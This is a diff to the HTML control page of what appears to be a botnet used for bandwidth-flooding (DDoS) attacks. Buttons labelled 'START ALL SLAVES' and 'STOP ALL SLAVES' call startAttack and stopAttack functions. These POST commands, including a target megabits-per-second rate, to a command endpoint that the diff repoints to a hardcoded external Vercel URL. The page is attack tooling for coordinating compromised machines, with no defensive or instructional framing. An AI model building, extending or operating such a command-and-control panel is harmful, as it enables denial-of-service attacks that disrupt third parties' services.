@@ -27,9 +27,8 @@
   <button onclick="startAttack()" style="padding:10px 20px;font-size:16px">🚀 START ALL SLAVES</button>
   <button onclick="stopAttack()" style="padding:10px 20px;font-size:16px">⛔ STOP ALL SLAVES</button>
 
-  <script>
-    const baseUrl = window.location.origin;
-    document.getElementById('url').textContent = baseUrl;
+<script>
+    const API_URL = "https://iosdfj.vercel.app/app/api/command/route.ts";
 
     async function startAttack() {
       const data = {
@@ -43,22 +42,22 @@
         target_mbps: parseFloat(document.getElementById('mbps').value)
       };
 
-      await fetch('/api/command', {
+      await fetch(API_URL, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(data)
       });
-      alert('✅ START command sent to all slaves!');
+      alert('✅ START sent!');
     }
 
     async function stopAttack() {
-      await fetch('/api/command', {
+      await fetch(API_URL, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({action: "stop"})
       });
-      alert('⛔ STOP command sent to all slaves!');
+      alert('⛔ STOP sent!');
     }
-  </script>
+</script>
 </body>
 </html>
